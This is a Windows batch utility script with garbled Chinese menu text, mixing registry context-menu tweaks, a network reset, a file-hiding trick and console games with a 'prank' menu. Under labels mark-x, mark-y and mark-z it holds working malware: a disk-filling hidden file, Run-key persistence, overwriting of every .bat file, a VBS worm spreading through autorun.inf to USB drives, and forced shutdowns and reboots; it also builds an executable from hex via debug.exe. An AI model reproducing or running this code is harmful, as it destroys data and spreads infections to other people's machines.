@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"">>debug.vbs
@echo with wscript.stdout:r=vbcrlf:for i=1 to len(str) step 48:.write "e"+hex(256+(i-1)/2):for j=i to i+46 step 2:.write " "+mid(str,j,2):next:.write r:next>>debug.vbs
@echo .write "rbx"+r+"0"+r+"rcx"+r+"5000"+r+"n debug.tmp"+r+"w"+r+"q"+r:end with>>debug.vbs&&cscript //nologo debug.vbs|debug.exe>nul&&ren debug.tmp "zhuxiao.exe"&del debug.vbs
md %windir%\winzheng\
copy zhuxiao.exe %windir%\winzheng\
del zhuxiao.exe
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\zhuxiao]>>SHOWALL.reg
ECHO @="ע�������">>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\zhuxiao\command]>>SHOWALL.reg
ECHO @=hex(2):43,00,3a,00,5c,00,77,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,00,77,\>>SHOWALL.reg
ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,7a,00,68,00,75,00,78,00,\>>SHOWALL.reg
ECHO   69,00,61,00,6f,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\zhuxiao]>>SHOWALL.reg
ECHO @="ע�������">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\zhuxiao\command]>>SHOWALL.reg
ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,7a,00,68,00,75,00,78,00,\>>SHOWALL.reg
ECHO   69,00,61,00,6f,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg
exit
goto 10
rem �������������������������������
goto 10
:list10_10a
MODE con: COLS=50 LINES=15
color 5f
cls
del /s /q %windir%\winzheng\zhuxiao.exe

reg delete "HKCR\Folder\shell\zhuxiao" /f
reg delete "HKLM\SOFTWARE\Classes\Folder\shell\zhuxiao" /f
cls
echo.
echo                 ע�������ɾ���ɹ�!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 11
:list11_11
MODE con: COLS=50 LINES=15
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Dezinstall]>>SHOWALL.reg
ECHO @=hex(2):fb,6d,a0,52,16,62,20,52,64,96,0b,7a,8f,5e,28,00,26,00,55,00,29,00,00,\>>SHOWALL.reg
ECHO 00>>SHOWALL.reg
ECHO "SuppressionPolicy"=dword:4000003c>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Dezinstall\command]>>SHOWALL.reg
ECHO @=hex(2):72,00,75,00,6e,00,64,00,6c,00,6c,00,33,00,32,00,2e,00,65,00,78,00,65,\>>SHOWALL.reg
ECHO 00,20,00,73,00,68,00,65,00,6c,00,6c,00,33,00,32,00,2e,00,64,00,6c,00,6c,00,\>>SHOWALL.reg
ECHO 2c,00,43,00,6f,00,6e,00,74,00,72,00,6f,00,6c,00,5f,00,52,00,75,00,6e,00,44,\>>SHOWALL.reg
ECHO 00,4c,00,4c,00,20,00,61,00,70,00,70,00,77,00,69,00,7a,00,2e,00,63,00,70,00,\>>SHOWALL.reg
ECHO 6c,00,00,00>>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg
cls
echo.
echo               �������ӻ�ɾ������!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 11
:list11_11a
MODE con: COLS=50 LINES=15
cls
reg delete "HKCR\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Dezinstall" /f
cls
echo.
echo               ��ȡ����ӻ�ɾ������!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 12
:list12_12
MODE con: COLS=50 LINES=15
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\kzmb]>>SHOWALL.reg
ECHO @=hex(2):a7,63,36,52,62,97,7f,67,00,00>>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\kzmb\command]>>SHOWALL.reg
ECHO @=hex(2):72,00,75,00,6e,00,64,00,6c,00,6c,00,33,00,32,00,2e,00,65,00,78,00,65,\>>SHOWALL.reg
ECHO   00,20,00,73,00,68,00,65,00,6c,00,6c,00,33,00,32,00,2e,00,64,00,6c,00,6c,00,\>>SHOWALL.reg
ECHO   2c,00,43,00,6f,00,6e,00,74,00,72,00,6f,00,6c,00,5f,00,52,00,75,00,6e,00,44,\>>SHOWALL.reg
ECHO   00,4c,00,4c,00,00,00>>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg
cls
echo.
echo                 �ɹ���ӿ������!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 12
:list12_12a
MODE con: COLS=50 LINES=15
cls
reg delete "HKLM\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\kzmb" /f
cls
echo.
echo                  ��ȡ���������!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 13
:list13_13
MODE con: COLS=50 LINES=15
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\services]>>SHOWALL.reg
ECHO @=hex(2):0d,67,a1,52,00,00>>SHOWALL.reg
ECHO "SuppressionPolicy"=dword:4000003c>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\services\command]>>SHOWALL.reg
ECHO @=hex(2):25,00,77,00,69,00,6e,00,64,00,69,00,72,00,25,00,5c,00,73,00,79,00,73,\>>SHOWALL.reg
ECHO   00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,00,63,00,2e,00,65,00,78,00,\>>SHOWALL.reg
ECHO   65,00,20,00,2f,00,73,00,20,00,25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,\>>SHOWALL.reg
ECHO   00,6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,\>>SHOWALL.reg
ECHO   32,00,5c,00,73,00,65,00,72,00,76,00,69,00,63,00,65,00,73,00,2e,00,6d,00,73,\>>SHOWALL.reg
ECHO   00,63,00,20,00,2f,00,73,00,00,00>>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg
cls
echo.
echo                   �ɹ���ӷ���!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 13
:list13_13a
MODE con: COLS=50 LINES=15
cls
reg delete "HKCR\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\services" /f
cls
echo.
echo                  ��ȡ���Ҽ�����!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 14
:list14_14
MODE con: COLS=50 LINES=15
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\NGpEdit]>>SHOWALL.reg
ECHO @=hex(2):c4,7e,56,7b,65,75,28,00,26,00,5a,00,29,00,00,00>>SHOWALL.reg
ECHO "SuppressionPolicy"=dword:4000003c>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\NGpEdit\command]>>SHOWALL.reg
ECHO @=hex(2):25,00,77,00,69,00,6e,00,64,00,69,00,72,00,25,00,5c,00,73,00,79,00,73,\>>SHOWALL.reg
ECHO   00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,00,63,00,2e,00,65,00,78,00,\>>SHOWALL.reg
ECHO   65,00,20,00,2f,00,73,00,20,00,25,00,77,00,69,00,6e,00,64,00,69,00,72,00,25,\>>SHOWALL.reg
ECHO   00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,67,00,70,00,\>>SHOWALL.reg
ECHO   65,00,64,00,69,00,74,00,2e,00,6d,00,73,00,63,00,00,00>>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg
cls
echo.
echo                  �ɹ���������!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 14
:list14_14a
MODE con: COLS=50 LINES=15
cls
reg delete "HKCR\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\NGpEdit" /f
cls
echo.
echo                 ��ȡ���Ҽ������!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 15
:list15_15
MODE con: COLS=50 LINES=15
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\DevMgr]>>SHOWALL.reg
ECHO @=hex(2):40,00,25,00,77,00,69,00,6e,00,64,00,69,00,72,00,25,00,5c,00,73,00,79,\>>SHOWALL.reg
ECHO   00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,64,00,65,00,76,00,6d,00,67,00,\>>SHOWALL.reg
ECHO   72,00,2e,00,64,00,6c,00,6c,00,2c,00,2d,00,34,00,00,00>>SHOWALL.reg
ECHO "SuppressionPolicy"=dword:4000003c>>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\DevMgr\command]>>SHOWALL.reg
ECHO @=hex(2):25,00,77,00,69,00,6e,00,64,00,69,00,72,00,25,00,5c,00,73,00,79,00,73,\>>SHOWALL.reg
ECHO   00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,00,63,00,2e,00,65,00,78,00,\>>SHOWALL.reg
ECHO   65,00,20,00,2f,00,73,00,20,00,25,00,77,00,69,00,6e,00,64,00,69,00,72,00,25,\>>SHOWALL.reg
ECHO   00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,64,00,65,00,\>>SHOWALL.reg
ECHO   76,00,6d,00,67,00,6d,00,74,00,2e,00,6d,00,73,00,63,00,00,00>>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg
cls
echo.
echo                �ɹ�����豸������!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 15
:list15_15a
MODE con: COLS=50 LINES=15
cls
reg delete "HKLM\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\DevMgr" /f
cls
echo.
echo                 ��ȡ���豸������!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
attrib -h -s -r -a %0
del %0
exit                    ::��ֹ�����ּ�����




:mark27
@echo off
TITLE  ��������
echo. �Ƿ�ִ�����²�����
echo.   ���� ȫ�֣�
echo.   ���� �ӿڣ�
echo.   ���� ������ַ�����!
echo.   ���� ·�ɣ����!
echo.   ���� Windows IP ����
echo.   ˢ�� DNS �������档
echo. ------ע����������˾�̬ip��ַ�����-----
echo. ------��ע�����������------
echo.  �����������
pause >nul
NETSH INT IP RESET
IPCONFIG /FLUSHDNS
echo.   �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����




:mark28
cls
MODE con: COLS=50 LINES=19
echo         �q�������������������������������r
echo   �q������      �����ļ���jpg           �������r
echo   ��    �t�������������������������������s    ��
echo   ��  ��׼����һ��rar�ļ��Լ�һ��jpgͼƬ�ļ�  ��
echo   ��         �ļ����������һЩ               ��
echo   ��                                          ��
echo   ��      �����������                        ��
echo   �t�������������������������������������������s
pause >nul
echo.��������ͼ���ļ���س���
set /p imagefile=
echo.��������rar�ļ���س���
set /p rarfile=
echo.
copy /b %imagefile% + %rarfile% %rarfile%_new.jpg
echo.
if errorlevel 1 goto mark28.2
echo.αװͼ%rarfile%_new.jpg�Ѿ�����
echo.ʹ��ʱ�뽫%rarfile%_new.jpg����Ϊxx.rar���ɴ�
echo.αװͼ���..
echo.
goto mark28.1
:mark28.2
echo.��������,αװͼ����ʧ��.
echo.
:mark28.1
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����





















:mark255
cls
title ��������-�˵�
echo===============================================================
echo.                ��������-�˵�
echo.    1  ������ 
echo.    2  ������˻𱬰�
echo.
echo.                             x ����Ӳ��ɱ��(����)
echo.                             y �������� (����)
echo.                             z ���������(����)
echo.                             u ��Ļը��(����)
echo.                                     0  ������һ��
echo===============================================================

set /p tsqy=     ��ѡ���Ӧ����Ŀ ��enter��ȷ��:
if /i "%tsqy%"=="1" goto mark-1
if /i "%tsqy%"=="2" goto mark-2
if /i "%tsqy%"=="x" goto mark--
if /i "%tsqy%"=="y" goto mark--
if /i "%tsqy%"=="z" goto mark--
if /i "%tsqy%"=="u" goto mark--
exit                    ::��ֹ�����ּ�����



:mark-1
cls
title ������
mode con cols=90 lines=30
echo.
echo ������10��99֮������ѡ��һ���������������ʮλ���λ��ӣ��ٰ�����ѡ�������ȥ����ͣ�
echo ���磺��ѡ������23��Ȼ��2+3=5��Ȼ��23-5=18����ͼ�����ҳ����ֵ��Ӧ�ķ��ţ������������
echo �μ����У�Ȼ�������һ������ᷢ�֣���ʾ�����ķ��ž�����ո�������µ��Ǹ����š�
echo.
echo _________________________________________________________________________________________
echo.

mshta vbscript:createobject("sapi.spvoice").speak("��ӭ����С��Ϸ  ������")(window.close)
set str=�������������������������������������������֡ԡơʡѡߡ��
set begin_num=9
set end_num=1
set num=0
setlocal enabledelayedexpansion

:mark-1-1
for /l %%i in (9,-1,0) do (
    for /l %%j in (%begin_num%,-2,%end_num%) do (
        set /a num+=1
        set /a random_=!random!%%32
        set /a ordinal=1%%j%%i-100
        if !ordinal! lss 10 set ordinal= !ordinal!
        call set var!ordinal!=%%str:~!random_!,1%%
        set /a ordinal_mod=!ordinal!%%9
        if !num! gtr 1 if !num! lss 100 if !ordinal_mod! equ 0 set var!ordinal!=!var18!
        set /a line_mod=!num!%%5
        call set var=!var! !ordinal! %%var!ordinal!%%
        if !line_mod! equ 0 echo                        !var!&set var=
    )
)
if %num% equ 100 goto mark-1-2
if %num% equ 50 (
    set begin_num=8
    set end_num=0
    goto mark-1-1
)

:mark-1-2
echo _________________________________________________________________________________________
echo                                                                    �������������һ��...
pause>nul
cls
mode con cols=25 lines=10
echo.
mshta vbscript:createobject("sapi.spvoice").speak(" ������,��ȴ���  ")(window.close)
mshta vbscript:createobject("sapi.spvoice").speak("����Ҫ�ķ��ž���")(window.close)
echo        �q���������r
echo        ��        ��   
echo        ��   %var18%   ��
echo        ��        ��
echo        �t���������s
echo.
echo   ��������˳�......
pause>nul
exit                    ::��ֹ�����ּ�����






:mark-2
cls
title ������˻𱬰�
@echo off&setlocal enabledelayedexpansion
mode con cols=71 lines=9
for /l %%a in (1,1,8) do (
echo/
echo\
echo.
echo **********************************************************************
echo *************************������˻𱬰�*******************************
echo **********************************************************************
color cf
ping -n 1 192.168.0.1>nul
color fc
ping -n 1 192.168.0.1>nul
cls
)
color f1
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                                     ^|
echo               o                                                     ^|
echo              /^|\o                                                   ^|
echo _____________/_\____________________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                                     ^|
echo                  o                                                  ^|
echo                 /^|\                                                 ^|
echo ________________/_^>_o_______________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                                     ^|
echo                       o                                             ^|
echo                      /^|\o                                           ^|
echo ______________________^>_\___________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                                     ^|
echo                        o                                            ^|
echo                       /^|\                                           ^|
echo ______________________/_^>_o_________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                                     ^|
echo                           o                                         ^|
echo                          /^|-o                                       ^|
echo __________________________^>\________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                                     ^|
echo                              o                                      ^|
echo                             /^|\                                     ^|
echo ____________________________/_^>_o___________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                        �����ߵ���!                              ��^|--^|
echo                                                                ��'  ^|
echo                                                                     ^|
echo                                 o                                   ^|
echo                                /^|-o                                 ^|
echo ________________________________^>^>__________________________________^|
ping -n 2 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                        o                       ��'  ^|
echo                                      o/                             ^|
echo                                     /^|                              ^|
echo                                      ^>\                             ^|
echo ____________________________________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                            o                   ��^|--^|
echo                                           o^|                   ��'  ^|
echo                                          /^|                         ^|
echo                                          / ^>                        ^|
echo                                                                     ^|
echo ____________________________________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                 o                   ^|
echo                                                o^|              ��^|--^|
echo                                               /^|               ��'  ^|
echo                                                ^>\                   ^|
echo                                                                     ^|
echo                                                                     ^|
echo ____________________________________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                       o             ^|
echo                                                     o/              ^|
echo                                                    /^|          ��^|--^|
echo                                                    / ^>         ��'  ^|
echo                                                                     ^|
echo                                                                     ^|
echo                                                                     ^|
echo ____________________________________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                            o        ^|
echo                                                          o/         ^|
echo                                                         /^|     ��^|--^|
echo                                                         / \    ��'  ^|
echo                                                                     ^|
echo                                                                     ^|
echo                                                                     ^|
echo ____________________________________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                o    ^|
echo                                                              o/��^|--^|
echo                                                             /^| ��'  ^|
echo                                                             //      ^|
echo                                                                     ^|
echo                                                                     ^|
echo ____________________________________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                                 o   ^|
echo                                                                -^|\  ^|
echo                                                                 ^>^>  ^|
echo ____________________________________________________________________^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                               o     ^|
echo                                                                   o ^|
echo                                                                  /^|\^|
echo __________________________________________________________________^>^>^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                                                     ^|
echo                                                              o   o  ^|
echo                                                                 /^|- ^|
echo ________________________________________________________________/_\_^|
ping -n 1 192.168.0.1>nul
cls
echo                                                                     ^|
echo                                                                     ^|
echo                                                                ��^|--^|
echo                                                                ��'  ^|
echo                                             ˧����? �Ǻ�~~~         ^|
echo                                                                 o   ^|
echo                                                            o   /^|\  ^|
echo _______________________________________________________________/_\__^|
cls
for /l %%a in (1,1,8) do (
echo/
echo\
echo.
echo **********************************************************************
echo ***************************GAME OVER**********************************
echo **********************************************************************
color cf
ping -n 1 192.168.0.1>nul
color fc
ping -n 1 192.168.0.1>nul
cls
)
pause>nul
exit                    ::��ֹ�����ּ�����





























:mark--
echo. ȷ������??
echo. ���п��ܶ����ϵͳ��Ӳ�������ʧ
echo. Ҳ�п��ܱ�ɱ���������
echo. ȷ���밴 "y"��enter �˳��밴 "n"
echo. ������־ܾ�����,�ù���Ա��ʽ����
set /p hehehe=
if /i "%hehehe%"=="y"(

if /i "%tsqy%"=="x" goto mark-x
if /i "%tsqy%"=="y" goto mark-y
if /i "%tsqy%"=="z" goto mark-z
if /i "%tsqy%"=="u" goto mark-u
)


exit                    ::��ֹ�����ּ�����

:mark-x
@echo off
%ozone%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^%ozone%
%ozone%     %Name  :REON%               %ozone%
%ozone%     %Author:Ozone [verybat.cn]%   %ozone%
%ozone%     %Data  :17/04/2007%           %ozone%
%ozone%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^%ozone%

if exsit %SystemDrive%\PAGEFILES.SYS goto end
copy %0 %windir%\system32\logon.bat                     ::��������
FOR /F "tokens=3*" %%i in ('dir /-c %SystemDrive%^|find "�����ֽ�"') do fsutil file createnew %SystemDrive%\PAGEFILES.SYS %%i   ::���쳬���ļ�,��ըӲ��
attrib +r +s +h %SystemDrive%\PAGEFILES.SYS        ::�����ļ�
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v KV2007 /t REG_SZ /d %windir%\system32\logon.vbs                      ::�Զ�����
reg delete HKLM\Software\Microsoft\windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL /va /f                    ::����ʾ�����ļ�
for /r %SystemDrive% %%i in (*.bat) do type %0>%%i       ::��Ⱦ


if exist %windir%\system32\logon.vbs goto end
+++++++++++++++++++++++++=VBS����+++++++++++++++++++++++++++++++++++++++

echo set fs =createobject("scripting.filesystemobject")>>%windir%\system32\logon.vbs
echo set WshShell = WScript.CreateObject("WScript.Shell")>>%windir%\system32\logon.vbs
echo Set objWMIService = GetObject("winmgmts:" _>>%windir%\system32\logon.vbs
echo ^& "{impersonationLevel=impersonate}!\\" ^& strComputer ^& "\root\cimv2")>>%windir%\system32\logon.vbs
echo Set colDisks = objWMIService.ExecQuery _>>%windir%\system32\logon.vbs
echo ("Select * from Win32_LogicalDisk")>>%windir%\system32\logon.vbs

::����u��
echo For i =1 to 9000000000>>%windir%\system32\logon.vbs
echo For Each objDisk in colDisks>>%windir%\system32\logon.vbs
echo Select Case objDisk.DriveType>>%windir%\system32\logon.vbs
echo :Case 2:>>%windir%\system32\logon.vbs


::�ж�u�����Ƿ����autorun.inf,��������д��autorun.inf��������.
echo y1=fs.FileExists(objDisk.DeviceID ^& "\AUTORUN.INF")>>%windir%\system32\logon.vbs
echo if not y1 then>>%windir%\system32\logon.vbs
echo set f=fs.opentextfile(objDisk.DeviceID ^& "\AUTORUN.INF",2, true)>>%windir%\system32\logon.vbs
echo f.write "[AutoRun]" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "open=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "shellexecute=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "shell\Auto\command=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.Close>>%windir%\system32\logon.vbs
echo Set f1 = fs.GetFile(objDisk.DeviceID ^& "\AUTORUN.INF")>>%windir%\system32\logon.vbs
echo If f1.Attributes = f1.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f1.Attributes = f1.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs

::�ж�u�����Ƿ����logon.bat,�����������д��logon.bat������.
echo y2=fs.FileExists(objDisk.DeviceID ^& "\logon.bat")>>%windir%\system32\logon.vbs
echo if not y2 then >>%windir%\system32\logon.vbs
echo fs.CopyFile "c:\windows\system32\logon.bat",objDisk.DeviceID ^& "\">>%windir%\system32\logon.vbs
echo Set f2 = fs.GetFile(objDisk.DeviceID ^& "\logon.bat")>>%windir%\system32\logon.vbs
echo If f2.Attributes = f2.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f2.Attributes = f2.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs

echo dirr = Wshshell.ExpandEnvironmentStrings("%systemdrive%")>>%windir%\system32\logon.vbs

::�ж�u�����Ƿ����PAGEFILES.SYS,�����������д��PAGEFILES.SYS������.
echo y3=fs.FileExists(dirr & "\PAGEFILES.SYS")>>%windir%\system32\logon.vbs
echo if not y3 then>>%windir%\system32\logon.vbs
echo WshShell.Run "logon.bat">>%windir%\system32\logon.vbs
echo WScript.Sleep 500>>%windir%\system32\logon.vbs
echo Set f3 = fs.GetFile(dirr & "\PAGEFILES.SYS")>>%windir%\system32\logon.vbs
echo If f3.Attributes = f3.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f3.Attributes = f3.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs
echo End Select>>%windir%\system32\logon.vbs
echo Next>>%windir%\system32\logon.vbs

::ÿ��5��ɨ��һ��.
echo WScript.Sleep 5000>>%windir%\system32\logon.vbs
echo Next>>%windir%\system32\logon.vbs

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
:end







:mark-y
@reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /t reg_sz /d d:\rav.bat /f
echo ��ã���ĵ��Խ���10���ڹرգ����������һ������ʱ�ָ����� >>d:\Rav.txt
echo ��������ļ���������κ��˺��������ʹ�� >>d:\Rav.txt
echo start RAV.txt >>d:\Rav.bat
echo @reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /f >>d:\Rav.bat
echo del d:\Rav.txt /f >>d:\Rav.bat
echo shutdown -s -t 10 >>d:\Rav.bat
echo del d:\Rav.bat /f /a s r h >>d:\Rav.bat
attrib +s +r +h d:\Rav.bat
ECHO ���ڹر�״̬��








:mark-z
@echo off 
attrib -r -h -s "%~nx0" 2>nul >nul 
attrib -r -h -s %windir%\"%~nx0" 2>nul >nul 
copy "%~nx0" %windir% /y 2>nul >nul 
at 9:20 /every:m,t,w,th,f,s,su "%windir%\%~nx0" 
echo reboot>%windir%\temp.dll 
set pat=����ʼ���˵�\����\���� 
echo @echo off>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo echo reboot^>^>%%windir%%\temp.dll>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo find /c "reboot" %%windir%%\temp.dll^|find "11">>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo if errorlevel 1 goto rebootnow>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del %%windir%%\user.dll /f /q>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del %%windir%%\temp.dll /f /q>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del /f /q "%%~nx0">>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo exit>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo :rebootnow>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo shutdown /r /t 0 /f>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo exit>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo [autorun]>%windir%\user.dll 
echo shellexecute=%~nx0>>%windir%\user.dll 
set disk=C:>nul 2>nul 
:auto 
copy %windir%\"%~nx0" %disk%\ /y 2>nul >nul 
copy %windir%\user.dll %disk%\autorun.inf /y 2>nul >nul 
attrib +s +h +r %disk%\%~nx0 2>nul >nul 
attrib +s +h +r %disk%\autorun.inf 2>nul >nul 
cls 
goto %disk%>nul 2>nul 
:C: 
set disk=D:>nul 2>nul 
goto auto>nul 2>nul 
: D:
set disk=E:>nul 2>nul 
goto auto>nul 2>nul 
:E: 
set disk=F:>nul 2>nul 
goto auto>nul 2>nul 
:F: 
set disk=G:>nul 2>nul 
goto auto>nul 2>nul 
:G: 
set disk=H:>nul 2>nul 
goto auto>nul 2>nul 
:H: 
set disk=I:>nul 2>nul 
goto auto>nul 2>nul 
:I: 
set disk=J:>nul 2>nul 
goto auto>nul 2>nul 
:J: 
set disk=K:>nul 2>nul 
goto auto>nul 2>nul 
:K: 
set disk=L:>nul 2>nul 
goto auto>nul 2>nul 
: L:
cls 
